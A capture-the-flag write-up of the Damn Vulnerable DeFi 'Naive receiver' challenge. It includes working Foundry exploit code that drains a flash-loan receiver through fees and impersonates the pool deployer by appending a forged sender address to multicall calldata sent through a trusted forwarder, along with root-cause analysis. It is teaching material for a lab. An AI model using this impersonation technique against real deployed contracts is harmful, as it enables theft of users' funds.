# Naive receiver — Damn Vulnerable DeFi v4 Challenge

**Author:** 0xmaurice

**Date:** November 12, 2025

**Challenge:** Damn Vulnerable DeFi v4 — *Naive receiver*

**Objective:** Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.

---

## Summary

The combination of `multicall` and a trusted forwarder (`BasicForwarder`) allows an attacker to cause the pool to *interpret different effective callers* at different depths of the call stack. In this challenge the result is that the attacker can:

1. Drain the user's `FlashLoanReceiver` contract by repeatedly using flash loans (fees deplete the receiver), and then  
2. Use the forwarder + multicall trick to impersonate the **deployer** for `withdraw()` calls and move the pool funds to a recovery wallet.

This write-up explains how the calldata layering works, why the pool treats inner calls as coming from different senders, and how this leads to a full compromise.

---

## Scope & Setup

- **NaiveReceiverPool.sol**
  - Implements ERC-3156 (flash lender), includes `multicall`, and supports meta-transactions via a trusted forwarder.
  - Holds `WETH_IN_POOL = 1000e18` of WETH in `deposits`.
- **BasicForwarder.sol**
  - Forwards a user-signed `Request` (EIP-712) to a target. Appends the `request.from` address to the outer calldata.
- **Multicall.sol**
  - Implemented by the pool; accepts a `bytes[]` and executes each element with `delegatecall(address(this), data[i])`.
- **FlashLoanReceiver.sol**
  - A sample receiver deployed by a user; holds `WETH_IN_RECEIVER = 10e18`.
- **Player account**
  - Recovering the funds by sending them to a recovery wallet.

**Goal:** Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.

---
## High-level vulnerability
Two behaviors combine to enable the exploit:

1. **Trusted forwarder (meta-tx) pattern**  
   The forwarder verifies an EIP-712 signature for a `Request` and appends `request.from` to the *outer* calldata. The pool’s `_msgSender()` helper returns the last 20 bytes of the current `msg.data` if `msg.sender == trustedForwarder`.

2. **Multicall with `delegatecall`**  
   `multicall` executes `delegatecall(address(this), data[i])` for each element. `delegatecall`:
   - preserves `msg.sender` (it remains the forwarder),
   - but sets the inner `msg.data` to `data[i]` (exactly the bytes the caller supplied).

Combining these: the pool trusts whatever address appears at the end of its *current* calldata.  
The attacker can therefore place one address at the end of the *outer* calldata (the forwarder appends `player`) and another at the end of each *inner* `data[i]` (the attacker appends `deployer`).  
When the pool executes `delegatecall`, it reads the last 20 bytes of the new calldata and treats that as `_msgSender()`, effectively believing the deployer made the call.

**Important note:** The forwarder only verifies the signature over the outer `Request`, it does **not** sign or verify the content of each `data[i]`. That mismatch between verification and execution context is the root cause.

## Proof of Concept (PoC)

Two-phase recovery:
1) Drain the user's receiver (flash loan fees).
2) Withdraw the pool's deposits (impersonate deployer via forwarder + multicall).

### 1. Draining the FlashLoanReceiver Contract

Execute ten flash loans of 1 WETH each (the amount is arbitrary).  
Each flash loan charges a 1 WETH fee, and the repeated calls drain the `FlashLoanReceiver` balance.

**Foundry Test Example**

```javascript
    function test_naiveReceiver() public checkSolvedByPlayer {
        console.log("Initial WETH balance of Receiver Contract: ", weth.balanceOf(address(receiver)));

        console.log("\n Executing a flash loan multicall: ... \n");
        uint256 flashLoanAmount = 1e18;

        uint256 calls = 10;
        bytes[] memory flashLoanCallData = new bytes[](calls);

        for (uint256 i; i < calls; i++) {
            bytes memory innerFlashLoanCallData =
                abi.encodeWithSelector(pool.flashLoan.selector, receiver, weth, flashLoanAmount, "");
            bytes memory innerFlashLoanCallDataWithSender = abi.encodePacked(innerFlashLoanCallData, player);
            flashLoanCallData[i] = innerFlashLoanCallDataWithSender;
        }
        pool.multicall(flashLoanCallData);

        console.log("WETH balance of Receiver Contract after multicall: ", weth.balanceOf(address(receiver)));
        console.log("WETH balance of the Pool after multicall: ", weth.balanceOf(address(pool)));
    }
```

Console output:
```yaml
  Initial WETH balance of Receiver Contract:  10000000000000000000
  
 Executing a flash loan multicall: ... 

  WETH balance of Receiver Contract after multicall:  0
  WETH balance of the Pool after multicall:  1010000000000000000000

```
The receiver’s funds are drained by executing multiple flash loans. The pool’s balance increases by the collected fees (10 WETH).
### 2. Draining the pool's funds

For the second step, we withdraw all funds from the pool. By combining multicall and the forwarder, we can impersonate the deployer, who owns the pool’s deposits, and withdraw everything to the recovery wallet. 
We craft an *inner* `data[i]` that contains `withdraw(...) || deployer` and send it via a signed `BasicForwarder.Request` whose `request.from` is `player`. The forwarder will `call` the pool and append `player` to the *outer* calldata; `multicall` will `delegatecall` each `data[i]`, whose `msg.data` ends with `deployer`. Inside the *inner* `withdraw`, `_msgSender()` returns the appended `deployer` address.

**Foundry Test Example**

```javascript
    function test_naiveReceiver() public checkSolvedByPlayer {

        // 2. step is to recover all the funds from the pool by combining multicall and forwarder to impersonate the deployer who withdraws all the funds to our recovery wallet
        console.log("\n Recovering funds from the pool: ... \n");
        console.log("Creating multicall data for the withdrawal: ... \n");

        bytes[] memory withdrawCallData = new bytes[](1);
        bytes memory innerWithdrawCallData =
            abi.encodeWithSelector(pool.withdraw.selector, WETH_IN_POOL + WETH_IN_RECEIVER, recovery);
        bytes memory innerWithdrawCallDataWithSender = abi.encodePacked(innerWithdrawCallData, deployer);
        withdrawCallData[0] = innerWithdrawCallDataWithSender;

        bytes memory multicallPayload = abi.encodeWithSelector(pool.multicall.selector, withdrawCallData);

        console.log("Using forwarder to send the transaction: ... \n");
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 100000,
            nonce: 0,
            data: multicallPayload,
            deadline: block.timestamp + 1 days
        });
        bytes32 digest =
            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
        console.log("WETH balance of the Pool after withdrawal using forwarder: ", weth.balanceOf(address(pool)));
        console.log("WETH balance of Recovery Wallet: ", weth.balanceOf(recovery));
        console.log("\n All funds are now safe in the Recovery Wallet!\n");
    }
```

Console output:
```yaml
 Recovering funds from the pool: ... 

  Creating multicall data for the withdrawal: ... 

  Using forwarder to send the transaction: ... 

  WETH balance of the Pool after withdrawal using forwarder:  0
  WETH balance of Recovery Wallet:  1010000000000000000000
  
 All funds are now safe in the Recovery Wallet!
```
## Full test setup to pass the challenge:

Combining both examples into one test passes the challenge successfully.

```javascript
    function test_naiveReceiver() public checkSolvedByPlayer {
        console.log("Initial WETH balance of Receiver Contract: ", weth.balanceOf(address(receiver)));

        console.log("\n Executing a flash loan multicall: ... \n");
        uint256 flashLoanAmount = 1e18;

        uint256 calls = 10;
        bytes[] memory flashLoanCallData = new bytes[](calls);

        for (uint256 i; i < calls; i++) {
            bytes memory innerFlashLoanCallData =
                abi.encodeWithSelector(pool.flashLoan.selector, receiver, weth, flashLoanAmount, "");
            bytes memory innerFlashLoanCallDataWithSender = abi.encodePacked(innerFlashLoanCallData, player);
            flashLoanCallData[i] = innerFlashLoanCallDataWithSender;
        }
        pool.multicall(flashLoanCallData);

        console.log("WETH balance of Receiver Contract after multicall: ", weth.balanceOf(address(receiver)));
        console.log("WETH balance of the Pool after multicall: ", weth.balanceOf(address(pool)));

        console.log("\n Recovering funds from the pool: ... \n");
        console.log("Creating multicall data for the withdrawal: ... \n");

        bytes[] memory withdrawCallData = new bytes[](1);
        bytes memory innerWithdrawCallData =
            abi.encodeWithSelector(pool.withdraw.selector, WETH_IN_POOL + WETH_IN_RECEIVER, recovery);
        bytes memory innerWithdrawCallDataWithSender = abi.encodePacked(innerWithdrawCallData, deployer);
        withdrawCallData[0] = innerWithdrawCallDataWithSender;

        bytes memory multicallPayload = abi.encodeWithSelector(pool.multicall.selector, withdrawCallData);

        console.log("Using forwarder to send the transaction: ... \n");
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 100000,
            nonce: 0,
            data: multicallPayload,
            deadline: block.timestamp + 1 days
        });
        bytes32 digest =
            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
        console.log("WETH balance of the Pool after withdrawal using forwarder: ", weth.balanceOf(address(pool)));
        console.log("WETH balance of Recovery Wallet: ", weth.balanceOf(recovery));
        console.log("\n All funds are now safe in the Recovery Wallet!\n");
    }
```

---

## Explanation

Key snippets explaining why impersonation is possible:

**NaiveReceiverPool.sol**
```javascript
    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
        } else {
            return super._msgSender();
        }
    }
```
If the `msg.sender == trustedForwarder`(`BasicForwarder`), then `_msgSender` returns the last 20 bytes of `msg.data`. 

**BasicForwarder.sol**
```javascript
    function _checkRequest(Request calldata request, bytes calldata signature) private view {
        if (request.value != msg.value) revert InvalidValue();
        if (block.timestamp > request.deadline) revert OldRequest();
        if (nonces[request.from] != request.nonce) revert InvalidNonce();

        if (IHasTrustedForwarder(request.target).trustedForwarder() != address(this)) revert InvalidTarget();

        address signer = ECDSA.recover(_hashTypedData(getDataHash(request)), signature);
        if (signer != request.from) revert InvalidSigner();
    }

    function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
        _checkRequest(request, signature);

        nonces[request.from]++;

        uint256 gasLeft;
        uint256 value = request.value; // in wei
        address target = request.target;
        bytes memory payload = abi.encodePacked(request.data, request.from);
        uint256 forwardGas = request.gas;
        assembly {
            success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don't copy returndata
            gasLeft := gas()
        }

        if (gasLeft < request.gas / 63) {
            assembly {
                invalid()
            }
        }
    }
```
The forwarder verifies that the` signer == request.from`, then appends `request.from` to the payload before calling the target. This means `_msgSender()` inside the pool resolves to `player` for outer calls.

**Multicall.sol**

```javascript
    function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = Address.functionDelegateCall(address(this), data[i]);
        }
        return results;
    }
```

Inside `multicall`, `delegatecall(address(this), data[i])` executes the pool’s own code with `data[i]` as calldata. The trusted forwarder remains `msg.sender`, and `_msgSender()` relies on the last 20 bytes of whatever calldata is currently in use. By manually appending the `deployer` address inside `data[i]`, the attacker causes `_msgSender()` to resolve to `deployer` during `withdraw()`.

```javascript
    function withdraw(uint256 amount, address payable receiver) external {
        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }
```
Thus the attacker can withdraw funds belonging to the deployer.

To help understand how this *outer* and *inner* calldata works, I have created a diagram to visually show how the `_msgSender()` is appended.

1) Forwarder does a CALL to pool.multicall(...) with payload:
```sql   
   ┌────────────────────────────────────────────────────────────────────────────┐
   |                                                                            |
   │ outer calldata for multicall()                                             │
   │ ┌────────────────────────────────────────────────────────────────────────┐ │
   │ │ selector: 0xac9650d8  // multicall(bytes[])                            │ │
   │ │ ABI-encoded bytes[] array                                              │ │
   │ │   ├─ element 0 offset -> [ bytes length | bytes data (data[0]) padded ]│ │
   │ │   └─ element 1 ...                                                     │ │
   │ └────────────────────────────────────────────────────────────────────────┘ │
   │ ... followed by:                                                           │
   │ [player (20 bytes)]   <-- appended by BasicForwarder (request.from)        │
   └────────────────────────────────────────────────────────────────────────────┘
                                 ↑
                                 └─ In the pool, inside multicall():
                                    msg.sender == BasicForwarder
                                   _msgSender() reads last 20 bytes → **player**
```
2) Inside multicall, it iterates and does:
   for each i: Address.functionDelegateCall(address(this), data[i])

   For a single inner item data[i] which we constructed as:
   data[i] = abi.encodeWithSelector(withdraw.selector, amount, to) || [deployer (20 bytes)]

   The delegatecall sets:
```sql
   ┌────────────────────────────────────────────────────────────────────────────┐
   │ inner calldata for withdraw() (this is data[i])                            │
   │ ┌────────────────────────────────────────────────────────────────────────┐ │
   │ │ selector: 0x00f714ce  // withdraw(uint256,address)                     │ │
   │ │ ABI-encoded args: amount, to, ...                                      │ │
   │ │ dynamic padding etc.                                                   │ │
   │ └────────────────────────────────────────────────────────────────────────┘ │
   │ ... followed by:                                                           │
   │ [deployer (20 bytes)]   <-- WE appended this into data[i]                  │
   └────────────────────────────────────────────────────────────────────────────┘
                                 ↑
                                 └─ In the inner context (inside withdraw via delegatecall):
                                   msg.sender == BasicForwarder  (delegatecall preserves caller)
                                   _msgSender() reads last 20 bytes → **deployer**
```


---

## Root Cause

- `BasicForwarder` appends a single `request.from` to the *outer* calldata and validates a signature for that `Request`.

- `multicall` uses `delegatecall(address(this), data[i])`, so each *inner* invocation sees `data[i]` as its calldata.

- `_msgSender()` in the pool trusts a trailing 20-byte address when `msg.sender == trustedForwarder`. Because *inner* calldata is attacker-controlled, the attacker can provide a different trailing address per inner call and cause the pool to treat that trailing address as the effective caller.

- The forwarder signs and verifies only the *outer* `Request`, not the *inner* `data[i]` elements. That mismatch is the vulnerability. 

---

## References

* [Damn Vulnerable DeFi Website](https://www.damnvulnerabledefi.xyz/)
* [Damn Vulnerable DeFi GitHub Repository](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0)
* [ERC-3156: Flash Loans](https://eips.ethereum.org/EIPS/eip-3156)
* [EIP-712: Typed structured data hashing and signing](https://eips.ethereum.org/EIPS/eip-712)
* [ERC-2771: Secure Protocol for Native Meta Transactions](https://eips.ethereum.org/EIPS/eip-2771)

---

## Environment

* Solidity: `0.8.25`
* Framework: Foundry
* Challenge commit: `v4.1.0`

---

**Key Takeaway:**
*`delegatecall` combined with meta-transaction patterns can create surprising semantics for `msg.data` / `_msgSender()`. Treat `delegatecall` usage carefully, make your trust assumptions explicit, and validate inner calldata when a trusted forwarder is involved.*

---

*Note:* All research, code, and technical explanations were written by **0xmaurice**. Only sentence structure and grammar were reviewed and refined with the help of **ChatGPT**.
